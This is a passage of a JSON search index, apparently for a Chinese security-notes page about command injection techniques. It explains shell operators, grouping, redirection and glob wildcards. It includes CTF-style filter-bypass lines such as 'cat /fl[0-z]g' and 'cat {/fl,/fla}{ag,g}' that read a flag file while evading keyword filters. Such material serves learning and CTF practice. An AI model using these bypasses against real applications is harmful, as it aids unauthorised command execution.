\u524d\u9762\u547d\u4ee4\u7684\u8fd4\u56de\u503c\u6765\u63a7\u5236\u5176\u540e\u9762\u547d\u4ee4\u7684\u6267\u884c\u3002","title":"Linux\u4e2d\u7684&amp;&amp;\u4e0e||"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#_6","text":"\u8bed\u6cd5\u683c\u5f0f\u5982\u4e0b\uff1a command1 && command2 [&& command3 ...] \u547d\u4ee4\u4e4b\u95f4\u4f7f\u7528 && \u8fde\u63a5\uff0c\u5b9e\u73b0\u903b\u8f91\u4e0e\u7684\u529f\u80fd\u3002 \u53ea\u6709\u5728 && \u5de6\u8fb9\u7684\u547d\u4ee4\u8fd4\u56de\u771f\uff08\u547d\u4ee4\u8fd4\u56de\u503c $? == 0 \uff09\uff0c && \u53f3\u8fb9\u7684\u547d\u4ee4\u624d\u4f1a\u88ab\u6267\u884c \u53ea\u8981\u6709\u4e00\u4e2a\u547d\u4ee4\u8fd4\u56de\u5047\uff08\u547d\u4ee4\u8fd4\u56de\u503c $? == 1 \uff09\uff0c\u540e\u9762\u7684\u547d\u4ee4\u5c31\u4e0d\u4f1a\u88ab\u6267\u884c $ cp ~/Desktop/1.txt ~/1.txt && rm ~/Desktop/1.txt && echo \"success\" \u793a\u4f8b \u4e2d\u7684\u547d\u4ee4\u9996\u5148\u4ece ~/Desktop \u76ee\u5f55\u590d\u5236 1.txt \u6587\u4ef6\u5230 ~ \u76ee\u5f55\uff1b\u6267\u884c\u6210\u529f\u540e\uff0c\u4f7f\u7528 rm \u5220\u9664\u6e90\u6587\u4ef6\uff1b\u5982\u679c\u5220\u9664\u6210\u529f\u5219\u8f93\u51fa\u63d0\u793a\u4fe1\u606f\u3002","title":"&amp;&amp;"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#_7","text":"\u8bed\u6cd5\u683c\u5f0f\u5982\u4e0b\uff1a command1 || command2 [|| command3 ...] \u547d\u4ee4\u4e4b\u95f4\u4f7f\u7528 || \u8fde\u63a5\uff0c\u5b9e\u73b0\u903b\u8f91\u6216\u7684\u529f\u80fd\u3002 \u53ea\u6709\u5728 || \u5de6\u8fb9\u7684\u547d\u4ee4\u8fd4\u56de\u5047\uff08\u547d\u4ee4\u8fd4\u56de\u503c $? == 1 \uff09\uff0c || \u53f3\u8fb9\u7684\u547d\u4ee4\u624d\u4f1a\u88ab\u6267\u884c\u3002\u8fd9\u548c c \u8bed\u8a00\u4e2d\u7684\u903b\u8f91\u6216\u8bed\u6cd5\u529f\u80fd\u76f8\u540c\uff0c\u5373\u5b9e\u73b0\u77ed\u8def\u903b\u8f91\u6216\u64cd\u4f5c\u3002 \u53ea\u8981\u6709\u4e00\u4e2a\u547d\u4ee4\u8fd4\u56de\u771f\uff08\u547d\u4ee4\u8fd4\u56de\u503c $? == 0 \uff09\uff0c\u540e\u9762\u7684\u547d\u4ee4\u5c31\u4e0d\u4f1a\u88ab\u6267\u884c\u3002 $ rm ~/Desktop/1.txt || echo \"fail\" \u5982\u679c ~/Desktop \u76ee\u5f55\u4e0b\u4e0d\u5b58\u5728\u6587\u4ef6 1.txt\uff0c\u5c06\u8f93\u51fa\u63d0\u793a\u4fe1\u606f\u3002","title":"||"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#_8","text":"\u5f53\u6709\u51e0\u4e2a\u547d\u4ee4\u8981\u8fde\u7eed\u6267\u884c\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u628a\u5b83\u4eec\u653e\u5728\u4e00\u884c\u5185\uff0c\u4e2d\u95f4\u7528 ; \u5206\u5f00\u3002","title":";\u5206\u53f7"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#_9","text":"\u547d\u4ee4\u66ff\u4ee3\uff0c\u5927\u90e8\u5206 Unix shell \u4ee5\u53ca\u7f16\u7a0b\u8bed\u8a00\u5982 Perl \u3001 PHP \u4ee5\u53ca Ruby \u7b49\u90fd\u4ee5\u6210\u5bf9\u7684\u91cd\u97f3\u7b26(\u53cd\u5f15\u53f7)\u4f5c\u6307\u4ee4\u66ff\u4ee3\uff0c\u610f\u601d\u662f\u4ee5\u67d0\u4e00\u4e2a\u6307\u4ee4\u7684\u8f93\u51fa\u7ed3\u679c\u4f5c\u4e3a\u53e6\u4e00\u4e2a\u6307\u4ee4\u7684\u8f93\u5165\u9879\u3002\u4f8b\u5982\u4ee5\u4e0b\u6307\u4ee4: echo It is now `date` \u7b49\u4ef7\u4e8e\uff1a echo It is now \u4e00 12\u6708 17 12:16:04 GMT 2018 \u5728\u6b63\u5f0f\u6267\u884c\u65f6\u4f1a\u4ea7\u751f\u4ee5\u4e0b\u8f93\u51fa\u7ed3\u679c\uff1a It is now \u4e00 12\u6708 17 12:16:04 GMT 2018","title":"`\u53cd\u5f15\u53f7\uff08\u91cd\u97f3\u7b26\uff09"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#_10","text":"\u88ab\u5355\u5f15\u53f7\u62ec\u4f4f\u7684\u5185\u5bb9,\u5c06\u88ab\u89c6\u4e3a\u5355\u4e00\u5b57\u7b26\u4e32\u3002\u5728\u5f15\u53f7\u5185\u7684\u53d8\u91cf $ \u7b26\u53f7\u5c06\u4f1a\u5931\u6548\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5c06\u88ab\u89c6\u4f5c\u4e00\u822c\u7b26\u53f7\u5904\u7406\u3002","title":"\u2018\u5355\u5f15\u53f7"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#_11","text":"\u88ab\u53cc\u5f15\u53f7\u62ec\u4f4f\u7684\u5185\u5bb9\uff0c\u5c06\u88ab\u89c6\u4e3a\u5355\u4e00\u5b57\u7b26\u4e32\uff0c\u9632\u6b62\u901a\u914d\u7b26\u7684\u6269\u5c55\uff0c\u4f46\u5141\u8bb8\u53d8\u91cf\u6269\u5c55 \uff0c\u8fd9\u70b9\u4e0e\u5355\u5f15\u53f7\u7684\u5904\u7406\u65b9\u5f0f\u4e0d\u540c","title":"\u201c\u53cc\u5f15\u53f7"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#_12","text":"\u683c\u5f0f\u4e3a\uff1a(command1;command2[;command3\u2026]) \u4e00\u6761\u547d\u4ee4\u9700\u8981\u72ec\u5360\u4e00\u4e2a\u7269\u7406\u884c\uff0c\u5982\u679c\u9700\u8981\u5c06\u591a\u6761\u547d\u4ee4\u653e\u5728\u540c\u4e00\u884c\uff0c\u547d\u4ee4\u4e4b\u95f4\u4f7f\u7528\u547d\u4ee4\u5206\u9694\u7b26\uff08;\uff09\u5206\u9694\u3002\u6267\u884c\u7684\u6548\u679c\u7b49\u540c\u4e8e\u591a\u4e2a\u72ec\u7acb\u7684\u547d\u4ee4\u5355\u72ec\u6267\u884c\u7684\u6548\u679c\u3002 \u8868\u793a\u5728\u5f53\u524d shell \u4e2d\u5c06\u591a\u4e2a\u547d\u4ee4\u4f5c\u4e3a\u4e00\u4e2a\u6574\u4f53\u6267\u884c\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u4f7f\u7528 () \u62ec\u8d77\u6765\u7684\u547d\u4ee4\u5728\u6267\u884c\u524d\u9762\u90fd\u4e0d\u4f1a\u5207\u6362\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\uff0c\u4e5f\u5c31\u662f\u8bf4\u547d\u4ee4\u7ec4\u5408\u90fd\u662f\u5728\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\u4e0b\u88ab\u6267\u884c\u7684\uff0c\u5c3d\u7ba1\u547d\u4ee4\u4e2d\u6709\u5207\u6362\u76ee\u5f55\u7684\u547d\u4ee4\u3002 \u547d\u4ee4\u7ec4\u5408\u5e38\u548c\u547d\u4ee4\u6267\u884c\u63a7\u5236\u7ed3\u5408\u8d77\u6765\u4f7f\u7528\u3002 \u7528\u62ec\u53f7\u5c06\u4e00\u4e32\u8fde\u7eed\u6307\u4ee4\u62ec\u8d77\u6765\uff0c\u8fd9\u79cd\u7528\u6cd5\u5bf9 shell \u6765\u8bf4\uff0c\u79f0\u4e3a\u6307\u4ee4\u7fa4\u7ec4\u3002\u5982\u4e0b\u9762\u7684\u4f8b\u5b50: (cd ~ ; vcgh=`pwd` ;echo $vcgh) \u6307\u4ee4\u7fa4\u7ec4\u6709\u4e00\u4e2a\u7279\u6027\uff0cshell\u4f1a\u4ee5\u4ea7\u751f subshell \u6765\u6267\u884c\u8fd9\u7ec4\u6307\u4ee4\u3002 $ rm ~/Desktop/1.txt || (cd ~/Desktop/;ls -a;echo \"fail\") \u5982\u679c\u76ee\u5f55 ~/Desktop \u4e0b\u4e0d\u5b58\u5728\u6587\u4ef6 1.txt\uff0c\u5219\u6267\u884c\u547d\u4ee4\u7ec4\u5408\u3002","title":"()\u6307\u4ee4\u7fa4\u7ec4"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#_13","text":"\u8fd9\u7ec4\u7b26\u53f7\u7684\u4f5c\u7528\u4e0e let \u6307\u4ee4\u76f8\u4f3c\uff0c\u7528\u5728\u7b97\u6570\u8fd0\u7b97\u4e0a\uff0c\u662f bash \u7684\u5185\u5efa\u529f\u80fd\u3002\u6240\u4ee5\uff0c\u5728\u6267\u884c\u6548\u7387\u4e0a\u4f1a\u6bd4\u4f7f\u7528 let\u6307\u4ee4\u8981\u597d\u8bb8\u591a\u3002 #!/bin/bash(( a = 10 ))echo -e \"inital value, a = $a\\n\"(( a++))echo \"after a++, a = $a\"","title":"(())"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#_14","text":"\u5176\u5b9e\u5927\u62ec\u53f7\u6709\u4e00\u79cd\u62fc\u63a5\u5b57\u7b26\u4e32\u7684\u7528\u6cd5\uff0c {xx,yy,zz,...} \u8fd9\u79cd\u5927\u62ec\u53f7\u7684\u7ec4\u5408\uff0c\u5e38\u7528\u5728\u5b57\u4e32\u7684\u7ec4\u5408\u4e0a\uff0c\u6765\u770b\u4e2a\u4f8b\u5b50 mkdir {userA,userB,userC}-{home,bin,data} \u6211\u4eec\u5f97\u5230 userA-home, userA-bin, userA-data, userB-home, userB-bin,userB-data, userC-home, userC-bin,userC-data \u3002\u4e8e\u662f\u6211\u4eec\u53ef\u4ee5\u6709 $ cat {/fl,/fla}{ag,g} flag{xxx} cat: /flg: No such file or directory cat: /flaag: No such file or directory flag{xxx}","title":"{}\u5927\u62ec\u53f7"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#_15","text":"\u5e38\u51fa\u73b0\u5728\u6d41\u7a0b\u63a7\u5236\u4e2d\uff0c\u626e\u6f14\u62ec\u4f4f\u5224\u65ad\u5f0f\u7684\u4f5c\u7528\u3002 if [ \"$?\" != 0 ]thenecho \"Executes error\"exit1fi \u3002\u8fd9\u4e2a\u7b26\u53f7\u5728\u6b63\u5219\u8868\u8fbe\u5f0f\u4e2d\u62c5\u4efb\u7c7b\u4f3c \u201c\u8303\u56f4\u201d \u6216 \u201c\u96c6\u5408\u201d \u7684\u89d2\u8272\u3002 $ cat /fl[0-z]g flag{xxx}","title":"[]\u4e2d\u62ec\u53f7"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#_16","text":"\u8fd9\u7ec4\u7b26\u53f7\u4e0e\u5148\u524d\u7684 [] \u7b26\u53f7\uff0c\u57fa\u672c\u4e0a\u4f5c\u7528\u76f8\u540c\uff0c\u4f46\u5979\u5141\u8bb8\u5728\u5176\u4e2d\u76f4\u63a5\u4f7f\u7528 || \u4e0e && \u903b\u8f91\u7b49\u7b26\u53f7\u3002 #!/bin/bashread akif [[ $ak > 5 || $ak< 9 ]]thenecho $akfi","title":"[[ ]]"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#_17","text":"\u90a3\u4e48\uff0c\u4e0b\u9762\u53c8\u6d89\u53ca\u5230\u4e86\u4e00\u4e2a\u95ee\u9898\uff0c\u5c31\u662f\u5c0f\u62ec\u53f7\uff0c\u4e2d\u62ec\u53f7\uff0c\u548c\u5927\u62ec\u53f7\u7684\u533a\u522b\u3002 \u5355\u5c0f\u62ec\u53f7\uff0c(cmd1;cmd2;cmd3) \u65b0\u5f00\u4e00\u4e2a\u5b50shell\u987a\u5e8f\u6267\u884c\u547d\u4ee4cmd1,cmd2,cmd3, \u5404\u547d\u4ee4\u4e4b\u95f4\u7528\u5206\u53f7\u9694\u5f00, \u6700\u540e\u4e00\u4e2a\u547d\u4ee4\u540e\u53ef\u4ee5\u6ca1\u6709\u5206\u53f7\u3002\u628a command group \u653e\u5728 subshell \u53bb\u6267\u884c\uff0c\u4e5f\u53eb\u505a nested sub-shell \u3002 \u5355\u5927\u62ec\u53f7\uff0c{ cmd1;cmd2;cmd3;} \u5728\u5f53\u524dshell\u987a\u5e8f\u6267\u884c\u547d\u4ee4cmd1,cmd2,cmd3, \u5404\u547d\u4ee4\u4e4b\u95f4\u7528\u5206\u53f7\u9694\u5f00, \u6700\u540e\u4e00\u4e2a\u547d\u4ee4\u540e\u5fc5\u987b\u6709\u5206\u53f7, \u7b2c\u4e00\u6761\u547d\u4ee4\u548c\u5de6\u62ec\u53f7\u4e4b\u95f4\u5fc5\u987b\u7528\u7a7a\u683c\u9694\u5f00\u3002\u82b1\u62ec\u53f7\u662f\u5728\u540c\u4e00\u4e2a shell \u5167\u5b8c\u6210\uff0c\u4e5f\u79f0\u4e3a non-namedcommand group \u3002 \u6240\u4ee5\u8bf4\uff0c\u5982\u679c\u5728shell\u91cc\u9762\u6267\u884c\u201c\u51fd\u6570\u201d\uff0c\u9700\u8981\u7528\u5230{}\uff0c\u5b9e\u9645\u4e0a\u4e5f\u5c31\u662f\u4e00\u4e2a\u547d\u4ee4\u7fa4\u7ec4\u4e48\u3002 \u4e0d\u8fc7\uff0c\u6839\u636e\u5b9e\u6d4b\uff0c test=$(ls -a) \u53ef\u4ee5\u6267\u884c\uff0c\u4f46\u662f test=${ls\u2013a} \u8bed\u6cd5\u4e0a\u9762\u662f\u6709\u9519\u8bef\u7684\u3002\u4f30\u8ba1\u4e5f\u548c\u4e0a\u9762\u6240\u8bf4\u7684\u539f\u56e0\u6709\u5173\u3002 \u53e6\u5916\uff0c\u4ece\u7f51\u4e0a\u6458\u5f55\u7684\u533a\u522b\u5982\u4e0b\uff1a ()\u53ea\u662f\u5bf9\u4e00\u4e32\u547d\u4ee4\u91cd\u65b0\u5f00\u4e00\u4e2a\u5b50shell\u8fdb\u884c\u6267\u884c {}\u5bf9\u4e00\u4e32\u547d\u4ee4\u5728\u5f53\u524dshell\u6267\u884c ()\u548c{}\u90fd\u662f\u628a\u4e00\u4e32\u7684\u547d\u4ee4\u653e\u5728\u62ec\u53f7\u91cc\u9762\uff0c\u5e76\u4e14\u547d\u4ee4\u4e4b\u95f4\u7528;\u53f7\u9694\u5f00 ()\u6700\u540e\u4e00\u4e2a\u547d\u4ee4\u53ef\u4ee5\u4e0d\u7528\u5206\u53f7 {}\u6700\u540e\u4e00\u4e2a\u547d\u4ee4\u8981\u7528\u5206\u53f7 {}\u7684\u7b2c\u4e00\u4e2a\u547d\u4ee4\u548c\u5de6\u62ec\u53f7\u4e4b\u95f4\u5fc5\u987b\u8981\u6709\u4e00\u4e2a\u7a7a\u683c ()\u91cc\u7684\u5404\u547d\u4ee4\u4e0d\u5fc5\u548c\u62ec\u53f7\u6709\u7a7a\u683c ()\u548c{}\u4e2d\u62ec\u53f7\u91cc\u9762\u7684\u67d0\u4e2a\u547d\u4ee4\u7684\u91cd\u5b9a\u5411\u53ea\u5f71\u54cd\u8be5\u547d\u4ee4\uff0c\u4f46\u62ec\u53f7\u5916\u7684\u91cd\u5b9a\u5411\u5219\u5f71\u54cd\u5230\u62ec\u53f7\u91cc\u7684\u6240\u6709\u547d\u4ee4 \u8fd9\u91cc\u5f15\u51fa\u6765 [..] \u548c [[...]] \u7684\u533a\u522b\uff1a\u4f7f\u7528 [[...]] \u6761\u4ef6\u5224\u65ad\u7ed3\u6784, \u800c\u4e0d\u662f [...] , \u80fd\u591f\u9632\u6b62\u811a\u672c\u4e2d\u7684\u8bb8\u591a\u903b\u8f91\u9519\u8bef.\u6bd4\u5982 && , || , < ,\u548c > \u64cd\u4f5c\u7b26\u80fd\u591f\u6b63\u5e38\u5b58\u5728\u4e8e [[ ]] \u6761\u4ef6\u5224\u65ad\u7ed3\u6784\u4e2d, \u4f46\u662f\u5982\u679c\u51fa\u73b0\u5728 [] \u7ed3\u6784\u4e2d\u7684\u8bdd\uff0c\u4f1a\u62a5\u9519\u3002 \u5bf9 {} \u548c () \u800c\u8a00, \u62ec\u53f7\u4e2d\u7684\u91cd\u5b9a\u5411\u7b26\u53ea\u5f71\u54cd\u8be5\u6761\u547d\u4ee4\uff0c \u800c\u62ec\u53f7\u5916\u7684\u91cd\u5b9a\u5411\u7b26\u5f71\u54cd\u5230\u62ec\u53f7\u4e2d\u7684\u6240\u6709\u547d\u4ee4\u3002","title":"\u5c0f\u62ec\u53f7\uff0c\u4e2d\u62ec\u53f7\uff0c\u548c\u5927\u62ec\u53f7\u7684\u533a\u522b"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#_18","text":"> >> < << :> &> 2&> 2<>>& >&2 \u6587\u4ef6\u63cf\u8ff0\u7b26(File Descriptor)\uff0c\u7528\u4e00\u4e2a\u6570\u5b57\uff08\u901a\u5e38\u4e3a0-9\uff09\u6765\u8868\u793a\u4e00\u4e2a\u6587\u4ef6\u3002 \u6587\u4ef6\u63cf\u8ff0\u7b26 \u540d\u79f0 \u5e38\u7528\u7f29\u5199 \u9ed8\u8ba4\u503c 0 \u6807\u51c6\u8f93\u5165 stdin \u952e\u76d8 1 \u6807\u51c6\u8f93\u51fa stdout \u5c4f\u5e55 2 \u6807\u51c6\u9519\u8bef\u8f93\u51fa stderr \u5c4f\u5e55 \u6211\u4eec\u5728\u7b80\u5355\u5730\u7528 < \u6216 > \u65f6\uff0c\u76f8\u5f53\u4e8e\u4f7f\u7528 0< \u6216 1> \uff08\u4e0b\u9762\u4f1a\u8be6\u7ec6\u4ecb\u7ecd\uff09\u3002 cmd > file \u628acmd\u547d\u4ee4\u7684\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u6587\u4ef6file\u4e2d\u3002\u5982\u679cfile\u5df2\u7ecf\u5b58\u5728\uff0c\u5219\u6e05\u7a7a\u539f\u6709\u6587\u4ef6\uff0c\u4f7f\u7528bash\u7684noclobber\u9009\u9879\u53ef\u4ee5\u9632\u6b62\u590d\u76d6\u539f\u6709\u6587\u4ef6\u3002 cmd \u00bb file \u628acmd\u547d\u4ee4\u7684\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u6587\u4ef6file\u4e2d\uff0c\u5982\u679cfile\u5df2\u7ecf\u5b58\u5728\uff0c\u5219\u628a\u4fe1\u606f\u52a0\u5728\u539f\u6709\u6587\u4ef6\u540e\u9762\u3002 cmd < file \u4f7fcmd\u547d\u4ee4\u4ecefile\u8bfb\u5165 cmd \u00ab text \u4ece\u547d\u4ee4\u884c\u8bfb\u53d6\u8f93\u5165\uff0c\u76f4\u5230\u4e00\u4e2a\u4e0etext\u76f8\u540c\u7684\u884c\u7ed3\u675f\u3002\u9664\u975e\u4f7f\u7528\u5f15\u53f7\u628a\u8f93\u5165\u62ec\u8d77\u6765\uff0c\u6b64\u6a21\u5f0f\u5c06\u5bf9\u8f93\u5165\u5185\u5bb9\u8fdb\u884cshell\u53d8\u91cf\u66ff\u6362\u3002\u5982\u679c\u4f7f\u7528 <<- \uff0c\u5219\u4f1a\u5ffd\u7565\u63a5\u4e0b\u6765\u8f93\u5165\u884c\u9996\u7684tab\uff0c\u7ed3\u675f\u884c\u4e5f\u53ef\u4ee5\u662f\u4e00\u5806tab\u518d\u52a0\u4e0a\u4e00\u4e2a\u4e0etext\u76f8\u540c\u7684\u5185\u5bb9\uff0c\u53ef\u4ee5\u53c2\u8003\u5f8c\u9762\u7684\u4f8b\u5b50\u3002 cmd \u00ab< word \u628aword\uff08\u800c\u4e0d\u662f\u6587\u4ef6word\uff09\u548c\u540e\u9762\u7684\u6362\u884c\u4f5c\u4e3a\u8f93\u5165\u63d0\u4f9b\u7ed9cmd\u3002 cmd <> file \u4ee5\u8bfb\u5199\u6a21\u5f0f\u628a\u6587\u4ef6file\u91cd\u5b9a\u5411\u5230\u8f93\u5165\uff0c\u6587\u4ef6file\u4e0d\u4f1a\u88ab\u7834\u574f\u3002\u4ec5\u5f53\u5e94\u7528\u7a0b\u5e8f\u5229\u7528\u4e86\u8fd9\u4e00\u7279\u6027\u65f6\uff0c\u5b83\u624d\u662f\u6709\u610f\u4e49\u7684\u3002 cmd >| file \u529f\u80fd\u540c>\uff0c\u4f46\u5373\u4fbf\u5728\u8bbe\u7f6e\u4e86noclobber\u65f6\u4e5f\u4f1a\u590d\u76d6file\u6587\u4ef6\uff0c\u6ce8\u610f\u7528\u7684\u662f|\u800c\u975e\u4e00\u4e9b\u4e66\u4e2d\u8bf4\u7684!\uff0c\u76ee\u524d\u4ec5\u5728csh\u4e2d\u4ecd\u6cbf\u7528 >! \u5b9e\u73b0\u8fd9\u4e00\u529f\u80fd\u3002 : > filename \u628a\u6587\u4ef6 filename \u622a\u65ad\u4e3a0\u957f\u5ea6\u3002\u5982\u679c\u6587\u4ef6\u4e0d\u5b58\u5728, \u90a3\u4e48\u5c31\u521b\u5efa\u4e00\u4e2a0\u957f\u5ea6\u7684\u6587\u4ef6(\u4e0e touch \u7684\u6548\u679c\u76f8\u540c). * cmd >&n \u628a\u8f93\u51fa\u9001\u5230\u6587\u4ef6\u63cf\u8ff0\u7b26n * cmd m>&n \u628a\u8f93\u51fa\u5230\u6587\u4ef6\u7b26m\u7684\u4fe1\u606f\u91cd\u5b9a\u5411\u5230\u6587\u4ef6\u63cf\u8ff0\u7b26n * cmd >&- \u5173\u95ed\u6807\u51c6\u8f93\u51fa * cmd <&n \u8f93\u5165\u6765\u81ea\u6587\u4ef6\u63cf\u8ff0\u7b26n * cmd m<&n m\u6765\u81ea\u6587\u4ef6\u63cf\u8ff0\u5404\u4e2an * cmd <&- \u5173\u95ed\u6807\u51c6\u8f93\u5165 * cmd <&n- \u79fb\u52a8\u8f93\u5165\u6587\u4ef6\u63cf\u8ff0\u7b26n\u800c\u975e\u590d\u5236\u5b83\u3002 * cmd >&n- \u79fb\u52a8\u8f93\u51fa\u6587\u4ef6\u63cf\u8ff0\u7b26n\u800c\u975e\u590d\u5236\u5b83\u3002 \u6ce8\u610f\uff1a >& \u5b9e\u9645\u4e0a\u590d\u5236\u4e86\u6587\u4ef6\u63cf\u8ff0\u7b26\uff0c\u8fd9\u4f7f\u5f97 cmd > file 2>&1 \u4e0e cmd 2>&1 >file \u7684\u6548\u679c\u4e0d\u4e00\u6837\u3002","title":"\u8f93\u5165\u8f93\u51fa/\u91cd\u5b9a\u5411"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#_19","text":"\u8fd8\u6709\u4e00\u7c7b\u901a\u914d\u7b26\uff0c\u9996\u5148\u5148\u4e86\u89e3\u4e0b\u4ec0\u4e48\u662fLinux shell\u901a\u914d\u7b26/glob\u6a21\u5f0f: glob \u6a21\u5f0f\uff08globbing\uff09\u4e5f\u88ab\u79f0\u4e4b\u4e3a shell \u901a\u914d\u7b26\uff0c\u540d\u5b57\u7684\u8d77\u6e90\u6765\u81ea\u4e8e Unix V6 \u4e2d\u7684 /etc/glob \uff08\u8be6\u89c1 man \u6587\u6863\uff09\u3002glob \u662f\u4e00\u79cd\u7279\u6b8a\u7684\u6a21\u5f0f\u5339\u914d\uff0c\u6700\u5e38\u89c1\u7684\u662f\u901a\u914d\u7b26\u62d3\u5c55\uff0c\u4e5f\u53ef\u4ee5\u5c06 glob \u6a21\u5f0f\u8bbe\u4e3a\u7cbe\u7b80\u4e86\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u5728\u6700\u65b0\u7684 CentOS 7 \u4e2d\u5df2\u7ecf\u5220\u9664\u4e86 glob \u7684\u76f8\u5173\u63cf\u8ff0\u6587\u6863\uff0c\u5220\u9664\u7684\u539f\u56e0\u7531\u4e8e glob \u5df2\u7ecf\u6574\u5408\u5230\u4e86 shell \u4e4b\u4e2d\uff0c\u7136\u540e\u5c31\u6709\u4e86 shell \u901a\u914d\u7b26\u3002 shell \u901a\u914d\u7b26 / glob \u6a21\u5f0f\u901a\u5e38\u7528\u6765\u5339\u914d\u76ee\u5f55\u4ee5\u53ca\u6587\u4ef6\uff0c\u800c\u4e0d\u662f\u6587\u672c\uff01\uff01\uff01","title":"\u901a\u914d\u7b26"},{"location":"other/%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/#_20","text":"\u5b57\u7b26 \u89e3\u91ca * \u5339\u914d\u4efb\u610f\u957f\u5ea6\u4efb\u610f\u5b57\u7b26 ? \u5339\u914d\u4efb\u610f\u5355\u4e2a\u5b57\u7b26 [list] \u5339\u914d\u6307\u5b9a\u8303\u56f4\u5185\uff08list\uff09\u4efb\u610f\u5355\u4e2a\u5b57\u7b26\uff0c\u4e5f\u53ef\u4ee5\u662f\u5355\u4e2a\u5b57\u7b26\u7ec4\u6210\u7684\u96c6\u5408 [^list] \u5339\u914d\u6307\u5b9a\u8303\u56f4\u5916\u7684\u4efb\u610f\u5355\u4e2a\u5b57\u7b26\u6216\u5b57\u7b26\u96c6\u5408 [!list] \u540c [^list] {str1,str2,\u2026} \u5339\u914d srt1 \u6216\u8005 srt2 \u6216\u8005\u66f4\u591a\u5b57\u7b26\u4e32\uff0c\u4e5f\u53ef\u4ee5\u662f\u96c6\u5408 IFS \u7531 < space > \u6216 < tab > \u6216 < enter > \u4e09\u8005\u4e4b\u4e00\u7ec4\u6210 CR \u7531 < enter > \u4ea7\u751f ! \u6267\u884c history \u4e2d\u7684\u547d\u4ee4 \u4ee5\u53ca\u8fd8\u6709\u4e13\u7528\u5b57\u7b26\u96c6 \u5b57\u7b26 \u610f\u4e49 [:alnum:] \u4efb\u610f\u6570\u5b57\u6216\u8005\u5b57\u6bcd [:alpha:] \u4efb\u610f\u5b57\u6bcd [:space:] \u7a7a\u683c [:lower:] \u5c0f\u5199\u5b57\u6bcd [:digit:] \u4efb\u610f\u6570\u5b57 [:upper:] \u4efb\u610f\u5927\u5199\u5b57\u6bcd [:cntrl:] \u63a7\u5236\u7b26 [:graph:] \u56fe\u5f62 [:print:] \u53ef\u6253\u5370\u5b57\u7b26 [:punct:] \u6807\u70b9\u7b26\u53f7 [:xdigit:] \u5341\u516d\u8fdb\u5236\u6570 [:blank:] \u7a7a\u767d\u5b57\u7b26 \u5728\u4f7f\u7528\u4e13\u5c5e\u5b57\u7b26\u96c6\u7684\u65f6\u5019\uff0c\u5b57\u7b26\u96c6\u4e4b\u5916\u8fd8\u9700\u8981\u7528 \u6765\u5305\u542b\u4f4f\uff0c\u5426\u5219\u4e13\u7528\u5b57\u7b26\u96c6\u4e0d\u4f1a\u751f\u6548\uff0c\u4f8b\u5982 [[:space:]] \u60f3\u8981\u8f6c\u4e49\u7684\u65f6\u5019\uff0c\u5355\u5f15\u53f7\u4e0e\u53cc\u5f15\u53f7\u4f7f\u7528\u65b9\u6cd5\u662f\u4e0d\u540c\u7684\uff0c\u5355\u5f15\u53f7\u4f1a\u8f6c\u4e49\u6240\u6709\u5b57\u7b26\uff0c\u800c\u4e14\u5355\u5f15\u53f7\u4e2d\u95f4\u4e0d\u5141\u8bb8\u518d\u51fa\u73b0\u5355\u5f15\u53f7\uff0c\u53cc\u5f15\u53f7\u5141\u8bb8\u51fa\u73b0\u7279\u5b9a\u7684 shell \u5143\u5b57\u7b26\uff0c\u5177\u4f53\u5b57\u7b26\u53ef\u4ee5\u81ea\u884c\u67e5\u8be2 \u5728\u4f7f\u7528\u82b1\u62ec\u53f7 {} 